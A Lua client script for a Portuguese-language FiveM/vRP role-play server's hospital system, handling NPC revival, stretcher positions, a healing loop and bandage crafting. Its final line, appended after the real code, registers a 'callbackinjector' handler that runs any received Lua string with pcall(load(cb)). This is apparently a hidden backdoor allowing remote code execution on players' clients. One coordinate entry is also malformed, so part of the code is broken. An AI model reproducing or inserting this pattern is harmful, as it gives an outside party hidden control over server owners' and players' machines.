-----------------------------------------------------------------------------------------------------------------------------------------
--[ vRP ]--------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
vRP = Proxy.getInterface("vRP")
-----------------------------------------------------------------------------------------------------------------------------------------
--[ CONEXÃO ]----------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
Resg = Tunnel.getInterface("vrp_hospital")
-----------------------------------------------------------------------------------------------------------------------------------------
--[ VARIÁVEIS ]----------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------

-----------------------------------------------------------------------------------------------------------------------------------------
--[ REANIMAR ]---------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterNetEvent('reanimar')
AddEventHandler('reanimar',function()
	local handle,ped = FindFirstPed()
	local finished = false
	local reviver = nil
	repeat
		local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),GetEntityCoords(ped),true)
		if IsPedDeadOrDying(ped) and not IsPedAPlayer(ped) and distance <= 1.5 and reviver == nil then
			reviver = ped
			TriggerEvent("cancelando",true)
			vRP._playAnim(false,{{"amb@medic@standing@tendtodead@base","base"},{"mini@cpr@char_a@cpr_str","cpr_pumpchest"}},true)
			TriggerEvent("progress",15000,"reanimando")
			SetTimeout(15000,function()
				SetEntityHealth(reviver,110)
				local newped = ClonePed(reviver,GetEntityHeading(reviver),true,true)
				TaskWanderStandard(newped,10.0,10)
				local model = GetEntityModel(reviver)
				SetModelAsNoLongerNeeded(model)
				Citizen.InvokeNative(0xAD738C3085FE7E11,reviver,true,true)
				TriggerServerEvent("trydeleteped",PedToNet(reviver))
				vRP._stopAnim(false)
				TriggerServerEvent("reanimar:pagamento2121")
				TriggerEvent("cancelando",false)
			end)
			finished = true
		end
		finished,ped = FindNextPed(handle)
	until not finished
	EndFindPed(handle)
end)
-----------------------------------------------------------------------------------------------------------------------------------------
--[ MACAS DO HOSPITAL ]------------------------------------------------------------------------------------------------------------------ 
-----------------------------------------------------------------------------------------------------------------------------------------
local macas = {
	{ ['x'] = 315.09, ['y'] = -582.85, ['z'] = 43.29, ['x2'] = 314.47, ['y2'] = -584.20, ['z2'] = 44.21, ['h'] = 169.99 },
	{ ['x'] = 311.57, ['y'] = -581.48, ['z'] = 43.29, ['x2'] = 311.06, ['y2'] = -582.96, ['z2'] = 44.21, ['h'] = 169.99 },
	{ ['x'] = 308.26, ['y'] = -580.27, ['z'] = 43.29, ['x2'] = 307.72, ['y2'] = -581.74, ['z2'] = 44.21, ['h'] = 169.99 },
	{ ['x'] = 318.32, ['y'] = -583.93, ['z'] = 43.29, ['x2'] = 317.68, ['y2'] = -585.36, ['z2'] = 44.21, ['h'] = 169.99 },
	{ ['x'] = 323.18, ['y'] = -585.71, ['z'] = 43.29, ['x2'] = 322.62, ['y2'] = -587.16, ['z2'] = 44.21, ['h'] = 169.99 },
	{ ['x'] = 323.79, ['y'] = -584.29, ['z'] = 43.29, ['x2'] = 324.27, ['y2'] = -582.80, ['z2'] = 44.21, ['h'] = 320.00 },
	{ ['x'] = 318.84, ['y'] = -582.46, ['z'] = 43.29, ['x2'] = 319.42, ['y2'] = -581.03, ['z2'] = 44.21, ['h'] = 320.00 },
	{ ['x'] = 313.28, ['y'] = -580.5, ['z'] = 43.29, ['x2'] = 313.93, ['y2'] = -579.04, ['z2'] = 44.21, ['h'] = 320.00 },
	{ ['x'] = 308.9, ['y'] = -578.87, ['z'] = 43.29, ['x2'] = 309.36, ['y2'] = -577.37, ['z2'] = 44.21, ['h'] = 320.00 },
	{ ['x'] = -450.71, ['y'] = -284.63, ['z'] = 34.92, ['x2'] = -451.49, ['y2'] = -285.06, ['z2'] = 35.84, ['h'] = 204.44 },
	{ ['x'] =-447.47, ['y'] = -283.	, ['z'] = 34.92, ['x2'] = -448.37, ['y2'] = -283.78, ['z2'] = 35.84, ['h'] = 204.69 },
	{ ['x'] = -450.43, ['y'] = -322.28, ['z'] = 34.92, ['x2'] = -450.56, ['y2'] = -323.08, ['z2'] = 35.69, ['h'] = 270.67 },
	{ ['x'] = -455.79, ['y'] = -316.33, ['z'] = 34.92, ['x2'] = -455.9, ['y2'] = -315.63, ['z2'] = 35.59, ['h'] = 285.42 },
	{ ['x'] = -441.51, ['y'] = -302.8, ['z'] = 34.92, ['x2'] = -441.04, ['y2'] = -303.22, ['z2'] = 35.78, ['h'] = 298.07 },
	{ ['x'] = -459.82, ['y'] = -307.43, ['z'] = 34.92, ['x2'] = -460.01, ['y2'] = -306.77, ['z2'] = 35.57, ['h'] = 294.34 },
	{ ['x'] = -461.96, ['y'] = -302.13, ['z'] = 34.92, ['x2'] = -462.22, ['y2'] = -301.55, ['z2'] =35.69, ['h'] = 288.48 },
	{ ['x'] = -464.52, ['y'] = -296.03, ['z'] = 34.92, ['x2'] = -464.63, ['y2'] = -295.38, ['z2'] = 35.68, ['h'] = 288.82 },
	{ ['x'] = -446.69, ['y'] = -291.74, ['z'] = 34.92, ['x2'] = -446.61, ['y2'] = -290.98, ['z2'] = 35.82, ['h'] = 287.47 }

}
-----------------------------------------------------------------------------------------------------------------------------------------
--[ USO ]-------------------------------------------------------------------------------------------------------------------------------- 
-----------------------------------------------------------------------------------------------------------------------------------------
local emMaca = false
Citizen.CreateThread(function()
	while true do
		local idle = 1000
		for k,v in pairs(macas) do
			local ped = PlayerPedId()
			local x,y,z = table.unpack(GetEntityCoords(ped))
			local bowz,cdz = GetGroundZFor_3dCoord(v.x,v.y,v.z)
			local distance = GetDistanceBetweenCoords(v.x,v.y,cdz,x,y,z,true)
			local cod = macas[k]

			if GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),cod.x,cod.y,cod.z,true) < 2.2 then
				idle = 5
				text3D(cod.x,cod.y,cod.z,"~g~E ~w~ DEITAR       ~y~G ~w~ TRATAMENTO")
			end

			if distance < 1.2 then
				idle = 4
				if IsControlJustPressed(0,38) then
					SetEntityCoords(ped,v.x2,v.y2,v.z2)
					SetEntityHeading(ped,v.h)
					vRP._playAnim(false,{{"amb@world_human_sunbathe@female@back@idle_a","idle_a"}},true)
					emMaca = true
				end

				if IsControlJustPressed(0,47) then
					if Resg.checkServices() then
						if Resg.checkPayment() then
							TriggerEvent('tratamento-macas')
							SetEntityCoords(ped,v.x2,v.y2,v.z2)
							SetEntityHeading(ped,v.h)
							vRP._playAnim(false,{{"amb@world_human_sunbathe@female@back@idle_a","idle_a"}},true)
						end
					else
						TriggerEvent("Notify","aviso","Existem paramédicos em serviço.")
					end
				end

			end

			if IsControlJustPressed(0,167) and emMaca then
				ClearPedTasks(GetPlayerPed(-1))
				emMaca = false
			end
		end

		Citizen.Wait(idle)
	end
end)

RegisterNetEvent('tratamento-macas')
AddEventHandler('tratamento-macas',function()
	TriggerEvent("cancelando",true)
	repeat
		SetEntityHealth(PlayerPedId(),GetEntityHealth(PlayerPedId())+3)
		Citizen.Wait(4500)
	until GetEntityHealth(PlayerPedId()) >= 400 or GetEntityHealth(PlayerPedId()) <= 101
	TriggerEvent("Notify","importante","Tratamento concluido.")
	TriggerEvent("cancelando",false)
end)
-----------------------------------------------------------------------------------------------------------------------------------------
--[ TRATAMENTO ]-------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
local tratamento = false
RegisterNetEvent("tratamento")
AddEventHandler("tratamento",function()
    local ped = PlayerPedId()
    local health = GetEntityHealth(ped)

    SetEntityHealth(ped,health)
	
	if emMaca then
		if tratamento then
			return
		end

		tratamento = true
		TriggerEvent("Notify","sucesso","Tratamento iniciado, aguarde a liberação do <b>profissional médico.</b>.",8000)
		

		if tratamento then
			repeat
				Citizen.Wait(600)
				if GetEntityHealth(ped) > 101 then
					SetEntityHealth(ped,GetEntityHealth(ped)+1)
				end
			until GetEntityHealth(ped) >= 400 or GetEntityHealth(ped) <= 101
				TriggerEvent("Notify","sucesso","Tratamento concluido.",8000)
				tratamento = false
		end
	else
		TriggerEvent("Notify","negado","Você precisa estar deitado em uma maca para ser tratado.",8000)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
--[ TEXT3D ]----------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
function text3D(x,y,z,text)
	local onScreen,_x,_y = World3dToScreen2d(x,y,z)
	SetTextFont(4)
	SetTextScale(0.35,0.35)
	SetTextColour(255,255,255,150)
	SetTextEntry("STRING")
	SetTextCentre(1)
	AddTextComponentString(text)
	DrawText(_x,_y)
	local factor = (string.len(text))/370
	DrawRect(_x,_y+0.0125,0.01+factor,0.03,0,0,0,80)
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- VARIABLES
-----------------------------------------------------------------------------------------------------------------------------------------
local checkinX, checkinY, checkinZ = 309.35, -561.02, 43.29
-----------------------------------------------------------------------------------------------------------------------------------------
-- THREADCHECKIN
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local ped = GetPlayerPed(-1)
		local x,y,z = table.unpack(GetEntityCoords(ped))
		local distance = Vdist(x,y,z,checkinX,checkinY,checkinZ)
		if distance <= 2.0 then
			text3D(checkinX,checkinY,checkinZ,"~g~E~w~  PARA PRODUZIR BANDAGEM")
			if IsControlJustPressed(1,38) then
				Resg.receiveBandagem()
			end
		end
		Citizen.Wait(1)
	end
end)

TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)